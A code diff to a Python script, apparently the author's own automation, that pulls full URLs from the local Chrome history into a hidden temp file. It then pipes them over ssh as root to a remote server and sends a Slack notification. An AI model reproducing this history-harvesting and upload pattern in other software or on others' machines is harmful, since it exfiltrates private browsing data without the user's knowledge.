@@ -51,7 +51,7 @@ def writelines_intofile(lines):
     f.writelines(lines)
     f.close()
 
-def work():
+def get_domains():
     #code execution starts here
     historyFile = getHistoryFile()
     queryResults = queryHistoryFile(historyFile)
@@ -65,9 +65,30 @@ def work():
     return URLs
 
 
+def get_urls():
+    URLs = []
+    try:
+        historyFile = getHistoryFile()
+        queryResults = queryHistoryFile(historyFile)
+        for line in queryResults:
+            URLs.append(line[0]+"\n")
+    except:
+        print("Error get_urls()")
+    return URLs
+
+def send_urls_to_vsvm():
+    try:
+        queryResults = get_urls()
+        writelines_intofile(queryResults)
+        command = "cat /tmp/.sdfbhdkslqf.txt |  ssh root@vsvm.mohammed.red -T 'cat >> /root/vsvm/Storage/urls_with_parameters.txt'"
+        os.system(command)
+        slack_notify("Chrome has sent today's full urls to VSMV.mohammed.red")
+    except:
+        print("Error get_urls()")
+
 def send_hostnames():
     try:
-        queryResults = work()
+        queryResults = get_domains()
         writelines_intofile(queryResults)
         command = "cat /tmp/.sdfbhdkslqf.txt |  ssh root@vsvm.mohammed.red -T 'cat >> /root/vsvm/Storage/urls.txt'"
         os.system(command)
